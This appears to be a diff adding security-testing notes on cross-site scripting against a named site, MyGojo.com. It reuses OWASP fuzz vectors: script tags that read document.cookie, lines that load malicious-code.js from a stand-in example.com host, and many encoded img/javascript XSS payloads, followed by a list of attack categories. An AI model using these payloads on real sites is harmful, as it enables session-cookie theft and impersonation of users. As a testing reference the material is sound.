@@ -1,0 +1,166 @@
+
+
+XSS Attacks and Issues with MyGojo.com
+
+Stored Cross Site Scripting vulnerability
+-----------------------------------------
+
+The goal of the XSS attack is to steal the client cookies or any other sensitive information which can authenticate the client to the web site. With the token of the legitimate user at hand, the attacker can proceed to act as the user in his/her interaction with the site, impersonating the user - Identity theft!
+Online message boards, web logs, guestbooks, and user forums where messages can be permanently stored also facilitate Cross Site Scripting attacks. In these cases, an attacker can post a message to the board with a link to a seemingly harmless site, which subtly encodes a script that attacks the user once they click the link. Attackers can use a wide range of encoding techniques to hide or obfuscate the malicious script and, in some cases, can avoid explicit use of the <Script> tag. Typically, XSS attacks involve malicious JavaScript, but they can also involve any type of executable active content. Although the types of attacks vary in sophistication, there is a generally reliable method to detect XSS vulnerabilities. Cross Site Scripting is used in many Phishing attacks.
+
+https://www.owasp.org/images/4/49/XSSStored1.PNG
+
+Techniques (examples):  TextBox enter:  <script>alert(“Cookie”+document.cookie)</script>
+												Url:  http://server/cgi-bin/testcgi.exe?<SCRIPT>alert(“Cookie”+document.cookie)</SCRIPT>
+												<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
+												<script src=http://www.example.com/malicious-code.js></script>
+												%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
+												\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
+												
+												http://www.example.com/>"><script>alert("XSS")</script>&
+												Textbox:    >"><script>alert("XSS")</script>&
+																		'';!--"<XSS>=&{()}
+																		
+																		
+																		
+																		
+												
+TESTING Guide: https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors
+
+
+
+When a user accesses a page on a site protected by forms authentication, the server looks for a valid authentication cookie. If no cookie is found, or if the cookie is not valid, the server redirects the browser to the logon page by using an HTTP 302 status code. At this page, the user is allowed to authenticate by using his or her credentials. After the credentials are validated, the server creates a valid authentication cookie and sends it back to the browser, with the originally requested page. The browser keeps the cookie in memory and sends it back to the server with every subsequent request to that Web server. With each request, the server checks the validity of the cookie to ensure that it is good (that it has not expired or been tampered with), and then processes the request.
+
+Because the authentication cookie is in memory with the browser process, it introduces some limitations:
+
+The cookie is retained only as long as the browser is open; when the browser is closed the cookie is destroyed with everything else in memory that the browser was using.
+
+
+By opening the document in Internet Explorer, the browser has the advantage of its process being able to use the authentication cookie that was created at logon. This enables Internet Explorer to open the document and respond to the authentication prompts without further intervention from the user. 
+
+
+Fuzzing - Recursive Fuzzing, Replacive Fuzzing
+
+>"><script>alert("XSS")</script>&
+"><STYLE>@import"javascript:alert('XSS')";</STYLE>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
+ alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+">
+>"
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')> 
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
+ &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
+ &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
+           
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
+ &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+
+
+
+Buffer Overflows (BFO)
+Format String Errors (FSE)
+Integer Overflows (INT)
+SQL Injection
+Passive SQL Injection (SQP)
+Active SQL Injection (SQI)
+LDAP Injection
+XPATH Injection
+XML Injection
+
+
+
+Attack Categories
+
+
+Account lockout attack
+Argument Injection or Modification
+Asymmetric resource consumption (amplification)
+
+Binary planting
+Blind SQL Injection
+Blind XPath Injection
+Brute force attack
+Buffer overflow attack
+
+Cache Poisoning
+Cash Overflow
+Code Injection
+Command Injection
+Comment Injection Attack
+Cross Frame Scripting
+Cross Site History Manipulation (XSHM)
+Cross Site Tracing
+Cross-Site Request Forgery (CSRF)
+Cross-site Scripting (XSS)
+Cross-User Defacement
+Cryptanalysis
+CSRF
+Custom Special Character Injection
+
+Denial of Service
+Direct Dynamic Code Evaluation ('Eval Injection')
+Direct Static Code Injection
+Double Encoding
+
+Forced browsing
+Format string attack
+Full Path Disclosure
+
+HTTP Request Smuggling
+HTTP Response Splitting
+
+LDAP injection
+
+Man-in-the-browser attack
+Man-in-the-middle attack
+Mobile code: invoking untrusted mobile code
+Mobile code: non-final public field
+Mobile code: object hijack
+
+Network Eavesdropping
+
+One-Click Attack
+Overflow Binary Resource File
+
+Page Hijacking
+Parameter Delimiter
+P cont.
+Path Manipulation
+Path Traversal
+
+Regular expression Denial of Service - ReDoS
+Relative Path Traversal
+Repudiation Attack
+Resource Injection
+
+Server-Side Includes (SSI) Injection
+Session fixation
+Session hijacking attack
+Session Prediction
+Setting Manipulation
+Special Element Injection
+Spyware
+SQL Injection
+
+Traffic flood
+Trojan Horse
+
+Unicode Encoding
+
+Web Parameter Tampering
+Windows ::DATA alternate data stream
+
+XPATH Injection
+XSRF
